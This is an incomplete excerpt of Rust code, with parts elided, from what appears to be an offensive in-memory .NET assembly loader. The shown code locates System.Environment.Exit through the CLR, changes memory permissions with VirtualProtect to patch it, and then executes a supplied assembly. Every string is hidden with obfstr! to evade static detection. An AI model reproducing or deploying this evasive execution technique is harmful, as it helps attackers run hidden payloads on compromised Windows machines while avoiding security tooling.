...
pub unsafe fn run(contents: Vec<u8>, args: Vec<String>) -> Result<String, String> {
    ...
    let environment = (*mscorlib).get_type(obfstr!("System.Environment"))?;
    let exit_fn = (*environment).get_method(obfstr!("Exit"))?;
    let method_info = (*mscorlib).get_type(obfstr!("System.Reflection.MethodInfo"))?;
    let method_handle = (*method_info).get_property(obfstr!("MethodHandle"))?;
    ...
    let runtime_method_handle = (*mscorlib).get_type(obfstr!("System.RuntimeMethodHandle"))?;
    let get_func_pointer = (*runtime_method_handle).get_method(obfstr!("GetFunctionPointer"))?;
    ...
    println!("{}{:x}{}", obfstr!("[+] `System.Environment.Exit` is: `0x"), value, obfstr!("`"));

    let mut old: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
    let mut restored: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);

    println!("{}", obfstr!("[+] Patching `System.Environment.Exit`"));

    if VirtualProtect(base_ptr as *const c_void, 1, PAGE_READWRITE, &mut old).0 != 1 {
        return Err(obfstr!("[!] Unable to change memory permissions at the function pointer for `System.Environment.Exit`").into());
    }
    ...
    if VirtualProtect(base_ptr as *const c_void, 1, old, &mut restored).0 != 1 {
        println!("{}", obfstr!("[!] Unable to change memory permissions at the function pointer back to the original value"));
    }

    println!("{}", obfstr!("[+] Executing the given assembly"));
